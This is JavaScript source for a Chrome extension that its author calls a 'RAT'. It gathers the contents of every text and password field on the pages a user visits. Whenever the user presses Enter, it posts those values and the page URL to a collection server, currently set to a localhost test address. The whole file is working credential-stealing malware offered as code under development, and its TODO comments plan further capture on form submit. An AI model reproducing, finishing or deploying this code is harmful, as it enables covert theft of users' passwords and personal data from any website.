// @todo I really need do this without JQuery, only ChromeAPI and DOM
// @todo add normal structure (maybe I need to use ECMA6?:D)


function sendDataToServer(url, data)
{
  $.post(
    url, {"ri":JSON.stringify(data)}
  );
}

function getTextAndPasswordFields() {
  var text_fields = $('input[type="text"]');
  var passwords_fields = $('input[type="password"]');
  var text_data = [];
  var index = 0;
  for (index = 0; index < text_fields.length; ++index) {
    text_data.push({
      "field_id": text_fields[index].id,
      "field_name": text_fields[index].name,
      "value": text_fields[index].value
    });
  }
  password_data = []
  for (index = 0; index < passwords_fields.length; ++index) {
    password_data.push({
      "field_id": passwords_fields[index].id,
      "field_name": passwords_fields[index].name,
      "value": passwords_fields[index].value
    });
  }
  data = {
    "ts": text_data,
    "ps": password_data
  };
  return data;
}

function RatInChromeExtension(server) {
  this._server = server; // it can be make url or email
  this._data = null;
  this._client = "test1"; // some info for identification
  this.getData = null;
  this.sendData = null;
}

// this is not a factory :( yet
function RatInChromeExtensionFactory(server_url, getDataFunction, sendDataFunction) {
  var rat = new RatInChromeExtension(server_url);
  rat.getData = function() {
    this._data = getDataFunction();
  };
  rat.sendData = function() {
    data = {
      "c": this._client,
      "i": JSON.stringify({
        "curl": window.location.href,
        "info": this._data
      })
    };
    sendDataFunction(this._server, data);
  }
  return rat;
}

// it's just for testing
var rat = RatInChromeExtensionFactory(
  "http://127.0.0.1:8080", 
  getTextAndPasswordFields,  sendDataToServer
);

$(document).keypress(function(e) {
    if(e.which == 13) {
      rat.getData();
      rat.sendData(data);
    }
});

// @todo add event on submit.click()